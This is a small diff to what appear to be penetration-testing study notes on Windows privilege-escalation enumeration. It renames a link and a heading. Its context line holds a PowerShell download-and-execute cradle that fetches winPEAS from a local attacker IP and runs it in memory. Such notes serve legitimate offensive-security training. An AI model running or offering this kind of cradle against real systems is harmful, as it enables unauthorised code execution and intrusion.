@@ -9,9 +9,11 @@
 ```powershell
 IEX(New-Object Net.WebClient).downloadString('http://192.168.45.247/winPEAS.ps1')
 ```
-[winPEAS.ps1 download](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
+[winPEAS Github](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
 
-**Enumeration requirements**
+<br>
+
+**Enumeration checklist**
 
 - Username and hostname
 - Group memberships of the current user
